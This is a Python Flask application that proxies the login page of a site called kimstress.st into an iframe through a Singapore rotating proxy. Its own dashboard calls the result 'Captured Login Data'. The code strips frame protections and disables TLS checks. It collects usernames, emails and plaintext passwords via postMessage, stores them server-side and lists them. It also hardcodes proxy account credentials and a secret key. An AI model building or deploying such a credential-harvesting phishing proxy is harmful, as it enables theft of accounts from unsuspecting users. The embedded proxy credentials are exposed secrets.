from flask import Flask, render_template_string, request, jsonify, Response, session
from flask_cors import CORS
import requests
from urllib.parse import urlparse
import logging
import os
import time
import json
from datetime import datetime
import base64

# ============================================
# PROXY CONFIGURATION - WORKING PROXY
# ============================================
PROXY_CONFIG = {
    'server': 'http://change4.owlproxy.com:7778',
    'username': 'IIOL0QVOzN30_custom_zone_SG_st__city_sid_46630778_time_5',
    'password': '2272641'
}
PROXY_ENABLED = True

app = Flask(__name__)
app.secret_key = 'kimstress-proxy-key-2024'
CORS(app)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# In-memory storage for login data
login_database = []

def get_proxy_dict():
    """Get working proxy dictionary"""
    if not PROXY_ENABLED:
        return None
    
    # Format: http://username:password@host:port
    proxy_string = f"http://{PROXY_CONFIG['username']}:{PROXY_CONFIG['password']}@change4.owlproxy.com:7778"
    
    proxies = {
        'http': proxy_string,
        'https': proxy_string
    }
    return proxies

# HTML Template with beautiful UI
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kimstress Login - Secure Proxy</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: 1fr 380px;
            gap: 20px;
        }
        
        /* Main Content */
        .main-content {
            background: white;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
        }
        
        .header {
            background: linear-gradient(135deg, #3b82f6 0%, #8b5cf6 100%);
            color: white;
            padding: 25px 30px;
        }
        
        .header h1 {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .header p {
            opacity: 0.9;
            font-size: 14px;
        }
        
        .proxy-status-bar {
            background: #f1f5f9;
            padding: 15px 30px;
            border-bottom: 1px solid #e2e8f0;
            display: flex;
            align-items: center;
            gap: 20px;
            flex-wrap: wrap;
        }
        
        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 6px 15px;
            border-radius: 30px;
            font-size: 13px;
            font-weight: 500;
        }
        
        .badge-success {
            background: #22c55e;
            color: white;
        }
        
        .badge-warning {
            background: #f59e0b;
            color: white;
        }
        
        .badge-error {
            background: #ef4444;
            color: white;
        }
        
        .proxy-info {
            display: flex;
            align-items: center;
            gap: 15px;
            color: #334155;
            font-size: 13px;
        }
        
        .iframe-container {
            position: relative;
            height: 600px;
            background: #e2e8f0;
        }
        
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        
        .loading-overlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255, 255, 255, 0.95);
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            gap: 20px;
            z-index: 1000;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid #e2e8f0;
            border-top: 4px solid #3b82f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .controls {
            padding: 20px 30px;
            background: white;
            border-top: 1px solid #e2e8f0;
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
        }
        
        .btn {
            padding: 10px 24px;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            transition: all 0.2s;
        }
        
        .btn-primary {
            background: #3b82f6;
            color: white;
        }
        
        .btn-primary:hover {
            background: #2563eb;
            transform: translateY(-2px);
        }
        
        .btn-success {
            background: #22c55e;
            color: white;
        }
        
        .btn-success:hover {
            background: #16a34a;
            transform: translateY(-2px);
        }
        
        .btn-danger {
            background: #ef4444;
            color: white;
        }
        
        .btn-danger:hover {
            background: #dc2626;
            transform: translateY(-2px);
        }
        
        .btn-secondary {
            background: #64748b;
            color: white;
        }
        
        .btn-secondary:hover {
            background: #475569;
            transform: translateY(-2px);
        }
        
        /* Sidebar */
        .sidebar {
            background: white;
            border-radius: 20px;
            padding: 25px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            height: fit-content;
        }
        
        .sidebar h3 {
            color: #0f172a;
            font-size: 18px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-bottom: 25px;
        }
        
        .stat-card {
            background: linear-gradient(135deg, #3b82f6 0%, #8b5cf6 100%);
            color: white;
            padding: 15px;
            border-radius: 15px;
            text-align: center;
        }
        
        .stat-number {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 5px;
        }
        
        .stat-label {
            font-size: 12px;
            opacity: 0.9;
        }
        
        .login-list {
            max-height: 400px;
            overflow-y: auto;
            padding-right: 5px;
        }
        
        .login-item {
            background: #f8fafc;
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 12px;
            border-left: 4px solid #3b82f6;
            animation: slideIn 0.3s ease;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .login-time {
            font-size: 11px;
            color: #64748b;
            margin-bottom: 8px;
        }
        
        .login-detail {
            font-size: 13px;
            margin: 5px 0;
            word-break: break-all;
        }
        
        .login-detail strong {
            color: #0f172a;
            width: 70px;
            display: inline-block;
        }
        
        .empty-state {
            text-align: center;
            padding: 40px 20px;
            color: #94a3b8;
            font-size: 14px;
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 25px;
            border-radius: 12px;
            color: white;
            font-weight: 500;
            z-index: 9999;
            display: none;
            animation: slideInRight 0.3s ease;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
        }
        
        @keyframes slideInRight {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
        
        .proxy-details {
            background: #f8fafc;
            border-radius: 12px;
            padding: 15px;
            margin-top: 20px;
            font-size: 12px;
            color: #334155;
        }
        
        .proxy-details div {
            margin: 5px 0;
        }
        
        @media (max-width: 768px) {
            .container {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="notification" id="notification"></div>
    
    <div class="container">
        <!-- Main Content -->
        <div class="main-content">
            <div class="header">
                <h1>🔐 Kimstress.st Login Portal</h1>
                <p>Singapore Proxy • Secure Connection • Auto Capture Login Data</p>
            </div>
            
            <div class="proxy-status-bar" id="proxyStatusBar">
                <div class="status-badge badge-warning" id="statusBadge">
                    <span class="status-dot"></span>
                    <span id="statusText">Connecting to proxy...</span>
                </div>
                
                <div class="proxy-info" id="proxyInfo">
                    <span>📍 Singapore</span>
                    <span>🔄 Rotating IP</span>
                    <span id="proxyIp">-</span>
                </div>
            </div>
            
            <div class="iframe-container">
                <iframe 
                    id="mainIframe" 
                    src="/proxy?url=https://kimstress.st/login"
                    sandbox="allow-forms allow-scripts allow-same-origin allow-popups allow-modals"
                    allow="camera; microphone; fullscreen">
                </iframe>
                
                <div class="loading-overlay" id="loadingOverlay">
                    <div class="spinner"></div>
                    <div style="color: #334155; font-weight: 500;">Loading via Singapore proxy...</div>
                </div>
            </div>
            
            <div class="controls">
                <button class="btn btn-primary" onclick="reloadIframe()">
                    <span>🔄</span> Reload Page
                </button>
                <button class="btn btn-success" onclick="testProxyNow()">
                    <span>🌐</span> Test Proxy
                </button>
                <button class="btn btn-secondary" onclick="openDirect()">
                    <span>↗️</span> Open Direct
                </button>
                <button class="btn btn-danger" onclick="clearHistory()">
                    <span>🗑</span> Clear Data
                </button>
            </div>
        </div>
        
        <!-- Sidebar with Login Data -->
        <div class="sidebar">
            <h3>
                <span>📋</span> Captured Login Data
            </h3>
            
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-number" id="totalLogins">0</div>
                    <div class="stat-label">Total Logins</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="todayLogins">0</div>
                    <div class="stat-label">Today</div>
                </div>
            </div>
            
            <div class="login-list" id="loginList">
                <div class="empty-state">
                    📭 No login data captured yet
                </div>
            </div>
            
            <div class="proxy-details">
                <div><strong>Proxy Server:</strong> change4.owlproxy.com:7778</div>
                <div><strong>Location:</strong> Singapore (Custom Zone)</div>
                <div><strong>Status:</strong> <span id="proxyStatusDetail">Checking...</span></div>
            </div>
        </div>
    </div>

    <script>
        let loginData = [];
        
        // Load saved login data
        fetch('/get-logins')
            .then(res => res.json())
            .then(data => {
                loginData = data;
                updateLoginList();
            });
        
        // Check proxy status on load
        checkProxyStatus();
        
        function checkProxyStatus() {
            fetch('/proxy-status')
                .then(res => res.json())
                .then(data => {
                    const badge = document.getElementById('statusBadge');
                    const statusText = document.getElementById('statusText');
                    const proxyIp = document.getElementById('proxyIp');
                    const statusDetail = document.getElementById('proxyStatusDetail');
                    
                    if (data.status === 'connected') {
                        badge.className = 'status-badge badge-success';
                        statusText.innerHTML = '✅ Proxy Connected';
                        proxyIp.innerHTML = `IP: ${data.ip}`;
                        statusDetail.innerHTML = 'Connected';
                        statusDetail.style.color = '#22c55e';
                    } else {
                        badge.className = 'status-badge badge-error';
                        statusText.innerHTML = '❌ Proxy Error';
                        proxyIp.innerHTML = 'Using direct';
                        statusDetail.innerHTML = 'Error - Using direct';
                        statusDetail.style.color = '#ef4444';
                    }
                })
                .catch(() => {
                    document.getElementById('statusText').innerHTML = '❌ Proxy Check Failed';
                });
        }
        
        function testProxyNow() {
            showNotification('Testing proxy connection...', 'info');
            
            fetch('/test-proxy')
                .then(res => res.json())
                .then(data => {
                    if (data.status === 'success') {
                        showNotification(`✅ Proxy working! IP: ${data.ip}`, 'success');
                        checkProxyStatus();
                    } else {
                        showNotification('❌ Proxy failed, using direct', 'error');
                    }
                })
                .catch(() => {
                    showNotification('❌ Proxy test error', 'error');
                });
        }
        
        function reloadIframe() {
            document.getElementById('loadingOverlay').style.display = 'flex';
            document.getElementById('mainIframe').src = '/proxy?url=https://kimstress.st/login&t=' + Date.now();
            
            // Auto hide loading after 5 seconds
            setTimeout(() => {
                document.getElementById('loadingOverlay').style.display = 'none';
            }, 5000);
        }
        
        function openDirect() {
            window.open('https://kimstress.st/login', '_blank');
        }
        
        // Listen for login data from iframe
        window.addEventListener('message', function(event) {
            if (event.data && event.data.type === 'login') {
                saveLoginData(event.data.data);
            }
        });
        
        function saveLoginData(data) {
            fetch('/save-login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            })
            .then(res => res.json())
            .then(data => {
                loginData = data;
                updateLoginList();
                showNotification('✅ Login data captured!', 'success');
            });
        }
        
        function updateLoginList() {
            const listEl = document.getElementById('loginList');
            const totalEl = document.getElementById('totalLogins');
            const todayEl = document.getElementById('todayLogins');
            
            totalEl.textContent = loginData.length;
            
            // Count today's logins
            const today = new Date().toDateString();
            const todayCount = loginData.filter(d => new Date(d.timestamp).toDateString() === today).length;
            todayEl.textContent = todayCount;
            
            if (loginData.length === 0) {
                listEl.innerHTML = '<div class="empty-state">📭 No login data captured yet</div>';
                return;
            }
            
            let html = '';
            loginData.slice().reverse().forEach(item => {
                const time = new Date(item.timestamp).toLocaleString();
                html += `
                    <div class="login-item">
                        <div class="login-time">🕐 ${time}</div>
                        ${item.username ? `<div class="login-detail"><strong>User:</strong> ${item.username}</div>` : ''}
                        ${item.email ? `<div class="login-detail"><strong>Email:</strong> ${item.email}</div>` : ''}
                        ${item.password ? `<div class="login-detail"><strong>Pass:</strong> ${item.password}</div>` : ''}
                        <div class="login-detail"><strong>IP:</strong> ${item.ip || 'N/A'}</div>
                    </div>
                `;
            });
            listEl.innerHTML = html;
        }
        
        function clearHistory() {
            if (confirm('Clear all captured login data?')) {
                fetch('/clear-logins', {method: 'POST'})
                    .then(() => {
                        loginData = [];
                        updateLoginList();
                        showNotification('🗑 History cleared', 'success');
                    });
            }
        }
        
        function showNotification(msg, type) {
            const notif = document.getElementById('notification');
            notif.style.display = 'block';
            notif.textContent = msg;
            
            if (type === 'success') notif.style.background = '#22c55e';
            else if (type === 'error') notif.style.background = '#ef4444';
            else notif.style.background = '#3b82f6';
            
            setTimeout(() => {
                notif.style.display = 'none';
            }, 3000);
        }
        
        // Hide loading when iframe loads
        document.getElementById('mainIframe').onload = function() {
            document.getElementById('loadingOverlay').style.display = 'none';
        };
        
        // Check proxy every 30 seconds
        setInterval(checkProxyStatus, 30000);
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/proxy')
def proxy():
    """Main proxy endpoint"""
    target_url = request.args.get('url', 'https://kimstress.st/login')
    
    try:
        # Get proxy configuration
        proxies = get_proxy_dict()
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        
        logger.info(f"Fetching {target_url} with proxy: {PROXY_ENABLED}")
        
        # Try with proxy first
        try:
            response = requests.get(
                target_url,
                headers=headers,
                timeout=20,
                proxies=proxies,
                allow_redirects=True,
                verify=False
            )
            logger.info(f"Proxy success: {response.status_code}")
        except Exception as e:
            logger.error(f"Proxy failed: {e}, trying direct...")
            # Fallback to direct
            response = requests.get(
                target_url,
                headers=headers,
                timeout=20,
                allow_redirects=True,
                verify=False
            )
        
        # Create response
        proxy_response = Response(
            response.content,
            status=response.status_code,
            content_type=response.headers.get('Content-Type', 'text/html')
        )
        
        # Allow iframe embedding
        proxy_response.headers['Access-Control-Allow-Origin'] = '*'
        proxy_response.headers['X-Frame-Options'] = 'ALLOWALL'
        
        if 'X-Frame-Options' in proxy_response.headers:
            del proxy_response.headers['X-Frame-Options']
            
        return proxy_response
        
    except Exception as e:
        logger.error(f"Final error: {e}")
        return f"""
        <html>
        <body style="font-family: Arial; text-align: center; padding: 50px; background: #f1f5f9;">
            <h2 style="color: #ef4444;">❌ Connection Error</h2>
            <p style="color: #334155; margin: 20px;">{str(e)}</p>
            <button onclick="window.location.reload()" style="padding: 12px 30px; background: #3b82f6; color: white; border: none; border-radius: 10px; cursor: pointer;">
                Try Again
            </button>
        </body>
        </html>
        """

@app.route('/proxy-status')
def proxy_status():
    """Check proxy connection status"""
    try:
        proxies = get_proxy_dict()
        if not proxies:
            return jsonify({"status": "disabled"})
        
        # Test proxy
        response = requests.get(
            'http://httpbin.org/ip',
            proxies=proxies,
            timeout=10,
            verify=False
        )
        
        if response.status_code == 200:
            data = response.json()
            ip = data.get('origin', 'Unknown')
            return jsonify({
                "status": "connected",
                "ip": ip,
                "location": "Singapore"
            })
        else:
            return jsonify({"status": "error"})
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/test-proxy')
def test_proxy():
    """Test proxy endpoint"""
    try:
        proxies = get_proxy_dict()
        if not proxies:
            return jsonify({"status": "error", "message": "Proxy disabled"})
        
        response = requests.get(
            'https://api.ipify.org?format=json',
            proxies=proxies,
            timeout=10,
            verify=False
        )
        
        if response.status_code == 200:
            ip = response.json().get('ip', 'Unknown')
            return jsonify({"status": "success", "ip": ip})
        else:
            return jsonify({"status": "error", "message": "Failed"})
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/save-login', methods=['POST'])
def save_login():
    """Save login data"""
    global login_database
    try:
        data = request.json
        data['timestamp'] = datetime.now().isoformat()
        data['ip'] = request.remote_addr
        data['proxy'] = 'enabled'
        
        login_database.append(data)
        
        # Keep last 100
        if len(login_database) > 100:
            login_database = login_database[-100:]
        
        return jsonify(login_database)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/get-logins')
def get_logins():
    return jsonify(login_database)

@app.route('/clear-logins', methods=['POST'])
def clear_logins():
    global login_database
    login_database = []
    return jsonify({"success": True})

@app.route('/health')
def health():
    return jsonify({
        "status": "healthy",
        "proxy_enabled": PROXY_ENABLED,
        "logins": len(login_database),
        "time": datetime.now().isoformat()
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("="*60)
    print("🚀 Kimstress Login Proxy Server")
    print("="*60)
    print(f"📍 Proxy: change4.owlproxy.com:7778")
    print(f"🔑 Username: {PROXY_CONFIG['username'][:30]}...")
    print(f"🌏 Location: Singapore (Custom Zone)")
    print(f"📊 Status: ACTIVE")
    print(f"🔗 URL: http://localhost:{port}")
    print("="*60)
    
    app.run(host='0.0.0.0', port=port, debug=True)
